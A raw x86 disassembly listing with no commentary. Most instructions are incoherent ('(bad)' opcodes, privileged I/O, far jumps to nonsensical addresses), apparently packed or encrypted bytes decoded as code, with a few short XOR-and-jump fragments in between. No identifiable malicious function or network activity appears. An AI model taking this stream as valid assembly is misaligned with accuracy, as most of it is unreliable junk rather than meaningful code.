  401990:	sbb    BYTE PTR [ebx],ah
  401992:	test   DWORD PTR [eax+0x5f],eax
  401995:	aaa    
  401996:	inc    ebp
  401997:	pushw  0xffe5
  40199a:	daa    
  40199b:	stc    
  40199c:	mov    ds:0xc029626c,eax
  4019a1:	jnp    0x4019e3
  4019a3:	push   ebp
  4019a4:	pusha  
  4019a5:	daa    
  4019a6:	and    bh,BYTE PTR [ebp+0x33b89de9]
  4019ac:	jo     0x40197b
  4019ae:	push   esp
  4019af:	sub    bh,ah
  4019b1:	popf   
  4019b2:	push   ebx
  4019b3:	call   0x7df69503
  4019b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019b9:	pop    eax
  4019ba:	stc    
  4019bb:	dec    ecx
  4019bc:	outs   dx,DWORD PTR ds:[esi]
  4019bd:	dec    edi
  4019be:	shr    BYTE PTR [ebx+0x5c],cl
  4019c1:	mov    edx,0xa33f6bbf
  4019c6:	inc    ecx
  4019c7:	out    dx,eax
  4019c8:	push   eax
  4019c9:	mov    ch,0xdd
  4019cb:	sub    BYTE PTR [ebx-0x12a6cc29],0x7c
  4019d2:	pop    edi
  4019d3:	mov    eax,0xa8f68a95
  4019d8:	dec    ebp
  4019d9:	mov    esi,0xa02853b3
  4019de:	sub    ecx,DWORD PTR ds:0xf3705823
  4019e4:	xchg   ecx,eax
  4019e5:	nop
  4019e6:	sbb    cl,bh
  4019e8:	fld    DWORD PTR [esi+0x0]
  4019eb:	(bad)  
  4019ec:	iret   
  4019ed:	or     esp,DWORD PTR [ecx-0x14]
  4019f0:	xor    eax,0x18cae118
  4019f5:	das    
  4019f6:	xor    eax,esp
  4019f8:	out    dx,al
  4019f9:	fs jo  0x401a2e
  4019fc:	sar    DWORD PTR [edx],cl
  4019fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019ff:	aaa    
  401a00:	retf   
  401a01:	mov    WORD PTR [esi+0x36],?
  401a04:	addr16 cwde 
  401a06:	push   esp
  401a07:	dec    edi
  401a08:	push   esi
  401a09:	mov    esp,0x4878a8ed
  401a0e:	pop    ebx
  401a0f:	outs   dx,DWORD PTR ds:[esi]
  401a10:	retf   0x9b86
  401a13:	call   0x6bfdb3f7
  401a18:	(bad)  
  401a1b:	jp     0x401a99
  401a1d:	inc    DWORD PTR [ebp-0x69]
  401a20:	pop    ds
  401a21:	mov    dh,0x4f
  401a23:	mov    bh,BYTE PTR [esi]
  401a25:	xor    al,0x8c
  401a27:	push   edi
  401a28:	addr16 jne 0x4019bd
  401a2b:	jnp    0x401a53
  401a2d:	sbb    DWORD PTR [edx],ebx
  401a2f:	(bad)  
  401a31:	mov    eax,0xe32cccf9
  401a36:	int3   
  401a37:	mov    bh,0x76
  401a39:	mov    cl,0x3a
  401a3b:	push   edi
  401a3c:	and    al,0x93
  401a3e:	jle    0x4019c6
  401a40:	mov    DWORD PTR ds:0xcde25aff,esp
  401a46:	rcr    DWORD PTR [eax+0x9],1
  401a49:	pop    ds
  401a4a:	add    BYTE PTR [edx+ecx*8+0x6d6078a9],cl
  401a51:	pop    eax
  401a52:	sub    al,0x73
  401a54:	sbb    dh,al
  401a56:	xchg   ecx,eax
  401a57:	and    DWORD PTR [esi],0x1e
  401a5a:	cmc    
  401a5b:	lahf   
  401a5c:	ror    BYTE PTR [eax],0xb9
  401a5f:	mov    DWORD PTR [edx+0x73d6f9a4],esp
  401a65:	fisttp QWORD PTR [edi]
  401a67:	jno    0x401a91
  401a69:	test   al,0x2d
  401a6b:	and    DWORD PTR [ebx-0x7b],esi
  401a6e:	outs   dx,BYTE PTR ds:[esi]
  401a6f:	ins    BYTE PTR es:[edi],dx
  401a70:	mov    cs,WORD PTR [esi-0x1014bf2]
  401a76:	dec    ecx
  401a77:	mov    DWORD PTR [ebp-0x50],ebx
  401a7a:	jmp    0x401c1b
  401a7f:	xchg   ecx,eax
  401a80:	mov    al,ds:0xe9b3d9b3
  401a85:	push   ecx
  401a86:	jo     0x401aa0
  401a88:	adc    BYTE PTR [esi],bl
  401a8a:	dec    esp
  401a8b:	(bad)  
  401a8c:	leave  
  401a8d:	mov    ch,0x77
  401a8f:	push   cs
  401a90:	js     0x401b10
  401a92:	jle    0x401a8e
  401a94:	jg     0x401b14
  401a96:	jle    0x401a98
  401a98:	mov    bl,0x3a
  401a9a:	jne    0x401aa4
  401a9c:	out    0x6e,al
  401a9e:	mov    ecx,0x7ae7888a
  401aa3:	sub    ch,al
  401aa5:	les    ebx,FWORD PTR [edx]
  401aa7:	popa   
  401aa8:	mov    bh,0x7b
  401aaa:	mov    al,ds:0xf75c3633
  401aaf:	in     al,dx
  401ab0:	jle    0x401ab6
  401ab2:	cmp    BYTE PTR ds:[ebx],al
  401ab5:	data16 xor cl,0x19
  401ab9:	inc    esi
  401aba:	into   
  401abb:	scas   eax,DWORD PTR es:[edi]
  401abc:	cli    
  401abd:	push   0xf98df50c
  401ac2:	popf   
  401ac3:	xchg   esp,eax
  401ac4:	call   0x6e19b5ee
  401ac9:	and    ebx,DWORD PTR [esi+0x709a7d7b]
  401acf:	dec    esp
  401ad0:	sub    DWORD PTR [edi+0x692dd6a0],esp
  401ad6:	jnp    0x401b0c
  401ad8:	in     al,dx
  401ad9:	and    ebx,edi
  401adb:	push   ds
  401adc:	jb     0x401b5b
  401ade:	and    BYTE PTR [edi-0x64],ah
  401ae1:	mov    bh,0x67
  401ae3:	jne    0x401b38
  401ae5:	adc    BYTE PTR [ebp-0x3c58ccad],ch
  401aeb:	adc    ebp,DWORD PTR fs:[edi-0x69]
  401aef:	mov    bl,0x6e
  401af1:	sbb    edi,DWORD PTR [edx-0x465a2d7e]
  401af7:	in     eax,0x3a
  401af9:	mov    ebx,0xbfd49728
  401afe:	fst    QWORD PTR [esi-0x2]
  401b01:	pop    eax
  401b02:	int    0x82
  401b04:	or     ah,ah
  401b06:	retf   0x8eab
  401b09:	mov    ds:0xc091b8da,al
  401b0e:	(bad)  
  401b0f:	xchg   ebp,eax
  401b10:	sbb    BYTE PTR [esi+0x4d7f4573],bh
  401b16:	dec    edx
  401b17:	(bad)  
  401b18:	rcl    BYTE PTR [eax+0x2a9d5fa3],0x81
  401b1f:	imul   esp,DWORD PTR [esi+0x4b7ef5dd],0x3732b730
  401b29:	(bad)  
  401b2a:	sub    ecx,esi
  401b2c:	jns    0x401b5c
  401b2e:	inc    eax
  401b2f:	das    
  401b30:	sub    DWORD PTR [edi],edi
  401b32:	mov    cl,0xea
  401b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b35:	cmp    BYTE PTR [esp+ecx*1+0x16461110],al
  401b3c:	test   BYTE PTR [edx+0x37],ch
  401b3f:	je     0x401b20
  401b41:	mov    ebp,0x2dbc6234
  401b46:	lods   al,BYTE PTR ds:[esi]
  401b47:	and    bh,ah
  401b49:	nop
  401b4a:	pop    ds
  401b4b:	sub    BYTE PTR [ecx+0xf],bh
  401b4e:	ret    
  401b4f:	xor    edx,DWORD PTR [esp+ecx*2]
  401b52:	aas    
  401b53:	lds    esp,FWORD PTR [esi]
  401b55:	inc    esp
  401b56:	mov    bl,0xf9
  401b58:	jbe    0x401bce
  401b5a:	or     ch,cl
  401b5c:	inc    ecx
  401b5d:	popa   
  401b5e:	sub    eax,DWORD PTR [ebp-0x600c6647]
  401b64:	sub    edx,esi
  401b66:	ret    0xddb6
  401b69:	mov    bl,0xa6
  401b6b:	inc    edi
  401b6c:	mov    al,0x3
  401b6e:	jmp    0x401b96
  401b70:	fxch   st(5)
  401b72:	cmc    
  401b73:	gs int3 
  401b75:	add    al,0x47
  401b77:	jno    0x401b9e
  401b79:	cwde   
  401b7a:	addr16 (bad) 
  401b7c:	cmp    BYTE PTR [edi],cl
  401b7e:	sar    BYTE PTR [eax],cl
  401b80:	pushf  
  401b81:	stc    
  401b82:	std    
  401b83:	mov    ebx,0xe6df632d
  401b88:	push   0xffffffd4
  401b8a:	xchg   ebp,eax
  401b8b:	dec    edx
  401b8c:	loop   0x401bce
  401b8e:	jb     0x401bc1
  401b90:	pop    ebp
  401b91:	xor    DWORD PTR [esi],esi
  401b93:	into   
  401b94:	neg    BYTE PTR [edx-0xe]
  401b97:	cs xor edx,ebx
  401b9a:	cli    
  401b9b:	dec    ebx
  401b9c:	ja     0x401b96
  401b9e:	sar    BYTE PTR [ebx+0x40ac3a0d],cl
  401ba4:	cmp    BYTE PTR [edx+0x7877cfda],dl
  401baa:	fsubrp st(1),st
  401bac:	shl    DWORD PTR [eax-0x64],1
  401baf:	into   
  401bb0:	pop    esp
  401bb1:	repz dec edx
  401bb3:	addr16 nop
  401bb5:	cmp    BYTE PTR [ebx+0x9],0x7c
  401bb9:	enter  0x53b6,0x94
  401bbd:	pop    edi
  401bbe:	push   edx
  401bbf:	retf   0xcac1
  401bc2:	mov    dl,0x1
  401bc4:	add    DWORD PTR [ebx],0xffffffe5
  401bc7:	pop    esp
  401bc8:	lahf   
  401bc9:	jbe    0x401c1b
  401bcb:	adc    edi,DWORD PTR [ebx+edi*4-0x5b84440e]
  401bd2:	js     0x401c48
  401bd4:	ins    BYTE PTR es:[edi],dx
  401bd5:	mov    ebp,0xcbdb4643
  401bda:	mov    bl,0xd4
  401bdc:	ret    
  401bdd:	jp     0x401c43
  401bdf:	sbb    al,0x4b
  401be1:	rcl    al,cl
  401be3:	dec    esp
  401be4:	push   ds
  401be5:	add    BYTE PTR [ebx-0x7e],al
  401be8:	cmp    dl,BYTE PTR fs:[edi+ebx*1]
  401bec:	cmp    eax,0x9f38231
  401bf1:	jns    0x401bb9
  401bf3:	test   DWORD PTR [esi-0x57bd9cd4],0x3aa3464
  401bfd:	xchg   ebp,eax
  401bfe:	push   cs
  401bff:	adc    eax,0x228f7161
  401c04:	jno    0x401c7d
  401c06:	mov    edi,0x26c72390
  401c0b:	add    BYTE PTR [ebx],cl
  401c0d:	in     al,0xf
  401c0f:	jb     0x401bf7
  401c11:	stos   BYTE PTR es:[edi],al
  401c12:	xor    BYTE PTR [esi+edx*2-0x34],ah
  401c16:	push   ds
  401c17:	cmp    DWORD PTR [esi+0x458beffb],edx
  401c1d:	mov    al,0x8b
  401c1f:	dec    ebp
  401c20:	clc    
  401c21:	xor    eax,esi
  401c23:	add    eax,edi
  401c25:	mov    DWORD PTR [ecx],eax
  401c27:	mov    eax,DWORD PTR [ebp-0x24]
  401c2a:	mov    ecx,DWORD PTR [ebp-0x8]
  401c2d:	xor    eax,esi
  401c2f:	jmp    0x401dd0
  401c34:	pop    ss
  401c35:	xor    eax,DWORD PTR [ebx]
  401c37:	mov    dl,0x23
  401c39:	mov    dl,0xb7
  401c3b:	mov    bl,0xfb
  401c3d:	lahf   
  401c3e:	cmc    
  401c3f:	xchg   esp,eax
  401c40:	clc    
  401c41:	mov    cl,0xbe
  401c43:	repnz mov bh,BYTE PTR [ecx+0x7e]
  401c47:	jle    0x401c43
  401c49:	jg     0x401cc9
  401c4b:	jle    0x401c46
  401c4d:	xchg   ecx,eax
  401c4e:	mov    dl,0xb5
  401c50:	mov    ebp,0x6983fdc8
  401c55:	jecxz  0x401c2c
  401c57:	jno    0x401c50
  401c59:	ret    
  401c5a:	fwait
  401c5b:	pop    ecx
  401c5c:	adc    al,0x1e
  401c5e:	ins    DWORD PTR es:[edi],dx
  401c5f:	ret    0x7cb8
  401c62:	retf   
  401c63:	pop    ss
  401c64:	jl     0x401c39
  401c66:	repnz loopne 0x401c4d
  401c69:	dec    ebp
  401c6a:	or     BYTE PTR [esi-0x3d],al
  401c6d:	js     0x401bf3
  401c6f:	and    BYTE PTR [ebx+0x28],0x32
  401c73:	cdq    
  401c74:	jmp    0x1b00f79f
  401c79:	xor    DWORD PTR [esi],edi
  401c7b:	popa   
  401c7c:	inc    ebx
  401c7d:	xor    al,0x9
  401c7f:	ret    
  401c80:	test   bl,al
  401c82:	mov    bh,0x87
  401c84:	ins    BYTE PTR es:[edi],dx
  401c85:	inc    bx
  401c87:	inc    edx
  401c88:	lock mov edi,0xb532a82b
  401c8e:	stos   DWORD PTR es:[edi],eax
  401c8f:	rcl    dl,1
  401c91:	mov    DWORD PTR [edi+0x775c8cc5],edi
  401c97:	idiv   BYTE PTR [edx+0x74]
  401c9a:	push   edx
  401c9b:	cdq    
  401c9c:	pop    edi
  401c9d:	jmp    0x401c82
  401c9f:	jae    0x401c7b
  401ca1:	push   ss
  401ca2:	das    
  401ca3:	add    cl,BYTE PTR [esi]
  401ca5:	aad    0x79
  401ca7:	mov    edx,0x7582a61e
  401cac:	repz or cl,cl
  401caf:	test   BYTE PTR [ecx-0x11],dl
  401cb2:	sbb    bl,BYTE PTR [edx+esi*8]
  401cb5:	cdq    
  401cb6:	call   FWORD PTR ds:0xe24a3622
  401cbc:	or     eax,0x99cab410
  401cc1:	sahf   
  401cc2:	imul   edi,DWORD PTR [edx+ebp*4-0x30974bfe],0x75
  401cca:	ret    
  401ccb:	repz and bl,BYTE PTR [ebx]
  401cce:	and    al,0xb7
  401cd0:	mov    eax,0xef7bdcf
  401cd5:	inc    edx
  401cd6:	mov    ah,0xa2
  401cd8:	jp     0x401c75
  401cda:	popf   
  401cdb:	xchg   ebx,eax
  401cdc:	(bad)  
  401cdd:	aaa    
  401cde:	daa    
  401cdf:	mov    dh,0xe7
  401ce1:	lds    esp,FWORD PTR [eax-0xb]
  401ce4:	rcl    BYTE PTR [ebx-0x26],1
  401ce7:	lahf   
  401ce8:	mov    dh,BYTE PTR [eax-0x5fe46022]
  401cee:	sbb    BYTE PTR ds:0xbd4815e,al
  401cf4:	pop    ds
  401cf5:	mov    ebp,0x1440b4a9
  401cfa:	cmp    al,0xce
  401cfc:	lea    esi,[edi-0x4ecca42e]
  401d02:	inc    edi
  401d03:	rcr    DWORD PTR [edx-0x29f73c9c],0xb
  401d0a:	mov    ds:0x6e51b287,eax
  401d0f:	lahf   
  401d10:	in     eax,0x82
  401d12:	jge    0x401cb6
  401d14:	fild   WORD PTR [edx+0xd]
  401d17:	inc    esp
  401d18:	mov    bl,0xd3
  401d1a:	adc    al,0xb9
  401d1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d1d:	in     eax,dx
  401d1e:	mov    edx,0xe021040e
  401d23:	loopne 0x401cf4
  401d25:	mov    esi,0x273ad106
  401d2a:	out    dx,eax
  401d2b:	inc    ebp
  401d2c:	je     0x401d97
  401d2e:	push   cs
  401d2f:	mov    cl,0x4d
  401d31:	inc    edx
  401d32:	and    edi,edi
  401d34:	inc    ecx
  401d35:	leave  
  401d36:	sar    esi,0x2d
  401d39:	sub    BYTE PTR [edx],al
  401d3b:	push   eax
  401d3c:	ret    
  401d3d:	mov    DWORD PTR gs:[edx+edi*2+0x45],ebp
  401d42:	shl    bh,0x81
  401d45:	sbb    al,0x7d
  401d47:	ins    DWORD PTR es:[edi],dx
  401d48:	shl    DWORD PTR [edx-0x5a749fbe],1
  401d4e:	inc    esp
  401d4f:	jae    0x401dc4
  401d51:	mov    ebp,0xae7b0b68
  401d56:	xor    al,0x19
  401d58:	cli    
  401d59:	add    al,ah
  401d5b:	or     esi,DWORD PTR [edi+0x66ebac95]
  401d61:	mov    ds:0x35c9f22c,eax
  401d66:	mov    bh,0xcc
  401d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d69:	adc    ebp,DWORD PTR [ebp-0x3b51ca58]
  401d6f:	inc    edx
  401d70:	push   0xffffffae
  401d72:	ds push esi
  401d74:	icebp  
  401d75:	fwait
  401d76:	xchg   ecx,eax
  401d77:	jbe    0x401d11
  401d79:	jg     0x401d7f
  401d7b:	cmp    dl,BYTE PTR [eax]
  401d7d:	enter  0xf69d,0xb7
  401d81:	sub    BYTE PTR [ebp-0x76],ch
  401d84:	mov    al,0xc8
  401d86:	pop    esi
  401d87:	in     al,0x38
  401d89:	pop    ds
  401d8a:	std    
  401d8b:	enter  0xb91c,0x81
  401d8f:	dec    ecx
  401d90:	mov    ebx,0xa8bdc020
  401d95:	push   esi
  401d96:	mov    eax,ds:0xab3be398
  401d9b:	inc    edi
  401d9c:	in     eax,dx
  401d9d:	or     edx,DWORD PTR [edi+0x25442008]
  401da3:	retf   
  401da4:	pop    eax
  401da5:	imul   ebp,DWORD PTR [ebx],0x1e
  401da8:	sbb    cl,cl
  401daa:	mov    esi,DWORD PTR [esi]
  401dac:	sar    DWORD PTR [ebx],0x77
  401daf:	jne    0x401d34
  401db1:	xchg   edi,eax
  401db2:	jns    0x401de3
  401db4:	test   al,0xba
  401db6:	in     eax,0x3b
  401db8:	sbb    dl,BYTE PTR ds:0x592568a
  401dbe:	jne    0x401e3d
  401dc0:	iret   
  401dc1:	pop    eax
  401dc2:	sub    al,0x99
  401dc4:	test   BYTE PTR [ebx-0x59],al
  401dc7:	stc    
  401dc8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401dca:	int    0xd4
  401dcc:	das    
  401dcd:	outs   dx,DWORD PTR ds:[esi]
  401dce:	sbb    ebx,DWORD PTR [ebx+eax*1-0x39]
  401dd2:	mov    DWORD PTR [ecx+0x4],eax
  401dd5:	mov    eax,DWORD PTR [ebp-0x2c]
  401dd8:	mov    ecx,DWORD PTR [ebp-0x8]
  401ddb:	mov    DWORD PTR [ecx+0x8],eax
  401dde:	mov    eax,DWORD PTR [ebp-0x30]
  401de1:	mov    ecx,DWORD PTR [ebp-0x8]
  401de4:	mov    DWORD PTR [ecx+0xc],eax
  401de7:	mov    eax,DWORD PTR [ebp-0x34]
  401dea:	mov    ecx,DWORD PTR [ebp-0x8]
  401ded:	mov    DWORD PTR [ecx+0x10],eax
  401df0:	mov    eax,eax
  401df2:	mov    eax,DWORD PTR [ebp-0x20]
  401df5:	xor    eax,esi
  401df7:	add    eax,edi
  401df9:	jmp    0x401f9a
  401dfe:	mov    ah,0x22
  401e00:	les    eax,FWORD PTR [eax+edx*2]
  401e03:	loopne 0x401e79
  401e05:	mov    dl,0xc7
  401e07:	xor    DWORD PTR [eax+0x71b9fc38],ebp
  401e0d:	pop    ebx
  401e0e:	push   ss
  401e0f:	pop    es
  401e10:	jle    0x401e90
  401e12:	cli    
  401e13:	jg     0x401e93
  401e15:	jle    0x401ddb
  401e17:	push   0x6ad5dbe
  401e1c:	cmp    DWORD PTR [esi+0x36],esi
  401e1f:	jmp    0xa509a0f7
  401e24:	pusha  
  401e25:	jl     0x401dac
  401e27:	push   esp
  401e28:	adc    BYTE PTR [ebx-0x7fc3b858],ah
  401e2e:	sahf   
  401e2f:	ror    ecx,0xb9
  401e32:	jmp    0x20c74140
  401e37:	test   DWORD PTR [edi],ecx
  401e39:	mov    esi,0x383411bf
  401e3e:	push   esp
  401e3f:	xchg   ecx,eax
  401e40:	in     al,dx
  401e41:	xchg   edx,eax
  401e42:	pop    ecx
  401e43:	fild   WORD PTR [esi]
  401e45:	js     0x401eb7
  401e47:	and    DWORD PTR [edx+ebp*8],edx
  401e4a:	aam    0xa5
  401e4c:	push   ss
  401e4d:	outs   dx,BYTE PTR ds:[esi]
  401e4e:	pop    ebx
  401e4f:	mov    esi,0x5c532dce
  401e54:	std    
  401e55:	sub    eax,0xfa8ff09a
  401e5a:	mov    ds:0x682dda9b,eax
  401e5f:	inc    ecx
  401e60:	mov    cs,ebx
  401e62:	icebp  
  401e63:	aad    0x18
  401e65:	xor    BYTE PTR [ecx-0x709e6109],bh
  401e6b:	iret   
  401e6c:	jle    0x401ecb
  401e6e:	and    dh,bl
  401e70:	ret    
  401e71:	mov    DWORD PTR [ecx],ecx
  401e73:	shl    BYTE PTR [eax+0x3acb5075],cl
  401e79:	test   eax,0xa8490a06
  401e7e:	sti    
  401e7f:	js     0x401ea7
  401e81:	retf   0x169e
  401e84:	dec    ecx
  401e85:	and    esi,edx
  401e87:	push   ds
  401e88:	aas    
  401e89:	or     ecx,DWORD PTR [edx-0x7f]
  401e8c:	push   0xfffffffc
  401e8e:	cwde   
  401e8f:	pop    esp
  401e90:	into   
  401e91:	cmp    al,0x4a
  401e93:	mov    al,ds:0xc9706773
  401e98:	inc    esi
  401e99:	sbb    ah,bh
  401e9b:	scas   eax,DWORD PTR es:[edi]
  401e9c:	mov    ecx,0xd30e0355
  401ea1:	xchg   BYTE PTR [ebp+0x3ba0d9de],ah
  401ea7:	mov    ecx,DWORD PTR [edx]
  401ea9:	add    al,0x32
  401eab:	mov    edx,0x32b77989
  401eb0:	clc    
  401eb1:	push   ds
  401eb2:	xchg   ecx,eax
  401eb3:	hlt    
  401eb4:	pop    edx
  401eb5:	jnp    0x401eda
  401eb7:	xchg   esp,eax
  401eb8:	inc    eax
  401eb9:	(bad)  
  401eba:	jg     0x401e3e
  401ebc:	aas    
  401ebd:	test   BYTE PTR [ebx-0x6e],bl
  401ec0:	(bad)  
  401ec1:	loope  0x401eda
  401ec3:	out    0x6d,eax
  401ec5:	ret    
  401ec6:	test   DWORD PTR [esi+0x6cd86a8],eax
  401ecc:	jle    0x401eaa
  401ece:	clc    
  401ecf:	enter  0xaef5,0x80
  401ed3:	sub    edi,DWORD PTR [edx]
  401ed5:	sub    ah,0x80
  401ed8:	or     DWORD PTR [edi-0x7b],eax
  401edb:	fdiv   st,st(4)
  401ede:	mov    dh,0xcb
  401ee0:	dec    ebx
  401ee1:	test   eax,0x98af9b6f
  401ee6:	repnz pop ebp
  401ee8:	imul   edi,DWORD PTR [ecx+0x207babec],0xffffffe1
  401eef:	out    dx,eax
  401ef0:	and    DWORD PTR [ebx-0x209e8e72],ebp
  401ef6:	mov    BYTE PTR [eax-0x77],al
  401ef9:	rcl    BYTE PTR [ecx+0x6a],0xf9
  401efd:	add    dh,BYTE PTR [ecx]
  401eff:	pop    ecx
  401f00:	pushf  
  401f01:	nop
  401f02:	jl     0x401f7e
  401f04:	cld    
  401f05:	outs   dx,BYTE PTR ds:[esi]
  401f06:	daa    
  401f07:	push   es
  401f08:	cmp    DWORD PTR [ebx-0x20],0x1b1872e9
  401f0f:	stos   BYTE PTR es:[edi],al
  401f10:	xchg   ebx,eax
  401f11:	jns    0x401f54
  401f13:	pushf  
  401f14:	jle    0x401f0e
  401f16:	int3   
  401f17:	cwde   
  401f18:	shl    BYTE PTR ds:0x2308ff3d,0x35
  401f1f:	mov    esp,0x72a4320d
  401f24:	retf   
  401f25:	jnp    0x401f70
  401f27:	lods   al,BYTE PTR ds:[esi]
  401f28:	popf   
  401f29:	js     0x401eec
  401f2b:	les    esi,FWORD PTR [eax+eiz*4-0x7]
  401f2f:	imul   esp,DWORD PTR [ecx+0x6a],0x4cf3b9e6
  401f36:	es push ss
  401f38:	xchg   ebp,eax
  401f39:	mov    edx,0xb0893b56
  401f3e:	push   0x7d194675
  401f43:	inc    edx
  401f44:	pop    ss
  401f45:	push   ecx
  401f46:	pop    edx
  401f47:	add    al,0x3f
  401f49:	push   cs
  401f4a:	jb     0x401ee2
  401f4c:	cwde   
  401f4d:	adc    al,bh
  401f4f:	xor    dl,ah
  401f51:	jns    0x401f31
  401f53:	test   al,0xbe
  401f55:	push   edi
  401f56:	or     al,0x6b
  401f58:	popa   
  401f59:	out    0xe2,al
  401f5b:	push   ebp
  401f5c:	lods   al,BYTE PTR ds:[esi]
  401f5d:	lea    edi,[edx]
  401f5f:	js     0x401f74
  401f61:	sub    DWORD PTR [ecx+0x45],edx
  401f64:	and    al,0x1f
  401f66:	pushf  
  401f67:	mov    ecx,0x210a7178
  401f6c:	ret    0xeec
  401f6f:	push   ss
  401f70:	xor    eax,0x2f83b84d
  401f75:	pop    eax
  401f76:	or     al,0xdd
  401f78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f79:	jg     0x401f22
  401f7b:	adc    al,0xc2
  401f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7e:	test   DWORD PTR [esi+0x411885f6],edx
  401f84:	test   BYTE PTR [eax+0x35bf1f29],dh
  401f8a:	int    0x2
  401f8c:	cmp    DWORD PTR [edx],ecx
  401f8e:	push   ebp
  401f8f:	add    al,0x41
  401f91:	adc    eax,0x898532a2
  401f96:	or     eax,0xf9ee083
  401f9b:	test   BYTE PTR [ebp+0x3],ch
  401f9e:	add    BYTE PTR [eax],al
  401fa0:	lea    eax,[ebp-0x98]
  401fa6:	push   eax
  401fa7:	mov    eax,DWORD PTR [ebp-0x1c]
  401faa:	xor    eax,esi
  401fac:	add    eax,edi
  401fae:	jmp    0x40214f
  401fb3:	pop    ecx
  401fb4:	and    al,0xad
  401fb6:	aas    
  401fb7:	jno    0x402010
  401fb9:	imul   esp,DWORD PTR [eax-0x4769416e],0xb41d20b5
  401fc3:	xchg   edx,eax
  401fc4:	add    al,0x7e
  401fc6:	jle    0x401fc2
  401fc8:	jg     0x402048
  401fca:	jle    0x401f67
  401fcc:	les    esp,FWORD PTR [ebx]
  401fce:	ret    
  401fcf:	sub    ah,ah
  401fd1:	out    0x1a,eax
  401fd3:	in     eax,0xe8
  401fd5:	pop    di
  401fd7:	pop    eax
  401fd8:	call   0xe70e8ba9
  401fdd:	icebp  
  401fde:	lahf   
  401fdf:	jecxz  0x40205d
  401fe1:	dec    esp
  401fe2:	mov    al,0x9b
  401fe4:	(bad)  
  401fe6:	ret    
  401fe7:	(bad)  
  401fe8:	stc    
  401fe9:	and    al,0x9b
  401feb:	retf   
  401fec:	imul   eax,DWORD PTR [esi+ebp*8+0x23],0x2e
  401ff1:	int    0xa1
  401ff3:	das    
  401ff4:	xchg   DWORD PTR [edx-0x7c91224],edx
  401ffa:	sti    
  401ffb:	pop    esi
  401ffc:	pop    ebp
  401ffd:	mov    edx,0xa52fe82e
  402002:	mov    eax,0xeaad7ad9
  402007:	jno    0x402002
  402009:	mov    DWORD PTR [ebx+0x3b],edx
  40200c:	adc    esp,edi
  40200e:	retf   0xa657
  402011:	mov    esi,0xfca1869b
  402016:	test   BYTE PTR [edi+eiz*2+0x48],cl
  40201a:	ret    
  40201b:	ficom  DWORD PTR [edx-0xe]
  40201e:	out    0xd5,al
  402020:	jmp    0x9c3cb929
  402025:	pop    ds
  402026:	(bad)  
  402027:	scas   eax,DWORD PTR es:[edi]
  402028:	add    bl,BYTE PTR [ebx+0x16]
  40202b:	mov    bh,0xb5
  40202d:	shl    BYTE PTR [edi+0x140c2317],1
  402033:	int    0xc1
  402035:	in     al,0x55
  402037:	call   FWORD PTR [esi-0x67]
  40203a:	inc    eax
  40203b:	leave  
  40203c:	jbe    0x402090
  40203e:	push   esp
  40203f:	jno    0x401fc1
  402041:	and    edi,DWORD PTR [ebx-0x6c]
  402044:	scas   al,BYTE PTR es:[edi]
  402045:	imul   edx,DWORD PTR [ebx],0x8337b7ef
  40204b:	dec    eax
  40204c:	lds    esi,FWORD PTR [edi-0x384ae2b5]
  402052:	mov    dh,0x93
  402054:	stos   DWORD PTR es:[edi],eax
  402055:	imul   esp,DWORD PTR [ebx],0xffffffc7
  402058:	fmul   QWORD PTR [esi-0x99250a1]
  40205e:	pop    ss
  40205f:	mov    bl,0xf9
  402061:	mov    ebx,0xd1c11598
  402066:	(bad)  
  402067:	push   edi
  402068:	cmp    BYTE PTR [ebx-0x4f244e90],0x2a
  40206f:	repnz dec edx
  402071:	(bad)  
  402072:	fisttp WORD PTR [esi+ecx*2]
  402075:	lods   eax,DWORD PTR ds:[esi]
  402076:	mov    BYTE PTR [ebx+0x1dca3b0f],bh
  40207c:	ins    BYTE PTR es:[edi],dx
  40207d:	xchg   ebp,eax
  40207e:	jns    0x40208d
  402080:	add    cl,BYTE PTR [edx]
  402082:	pusha  
  402083:	and    BYTE PTR [ebx+ebp*4],ah
  402086:	in     al,0x15
  402088:	mov    ds:0x933aef99,al
  40208d:	sub    al,0x1c
  40208f:	push   ebp
  402090:	xor    eax,0x12392990
  402095:	jb     0x402035
  402097:	sbb    al,ch
  402099:	mov    ebp,0x4926cfb6
  40209e:	ja     0x402069
  4020a0:	sbb    bl,BYTE PTR [ecx+0x20c133b7]
  4020a6:	(bad)  
  4020a7:	dec    esp
  4020a8:	lock daa 
  4020aa:	arpl   WORD PTR [ebx+0x7c],cx
  4020ad:	or     al,0xec
  4020af:	dec    edi
  4020b0:	cli    
  4020b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020b2:	push   ds
  4020b3:	data16 jns 0x402131
  4020b6:	(bad)  
  4020b7:	call   0xb0be:0x4eec3972
  4020be:	and    ah,dl
  4020c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020c1:	dec    ecx
  4020c2:	add    esp,eax
  4020c4:	and    ebp,ecx
  4020c6:	sar    BYTE PTR ds:0x45a00f83,0xe8
  4020cd:	mov    dl,dl
  4020cf:	nop
  4020d0:	sbb    DWORD PTR [ebp*2+0x39868f00],ebx
  4020d7:	stos   BYTE PTR es:[edi],al
  4020d8:	call   0x264a8211
  4020dd:	and    eax,0x49282c30
  4020e2:	jle    0x4020e6
  4020e4:	enter  0x47be,0xce
  4020e8:	rcr    BYTE PTR [ebx+eax*1-0x48],0x36
  4020ed:	(bad)  
  4020ef:	pusha  
  4020f0:	(bad)  
  4020f1:	mov    ebp,0x60f35b22
  4020f6:	inc    ebp
  4020f7:	or     al,0x19
  4020f9:	push   es
  4020fa:	dec    edx
  4020fb:	std    
  4020fc:	inc    esp
  4020fd:	mov    eax,0xce7f27f
  402102:	idiv   DWORD PTR [edx-0x743c56ef]
  402108:	inc    esi
  402109:	inc    eax
  40210a:	add    ebx,DWORD PTR [eax+0x2535bc14]
  402110:	in     eax,0x6
  402112:	push   esp
  402113:	jg     0x402138
  402115:	jmp    0x40212a
  402117:	scas   eax,DWORD PTR es:[edi]
  402118:	popa   
  402119:	or     esi,eax
  40211b:	fldenv ds:0x24a7a095
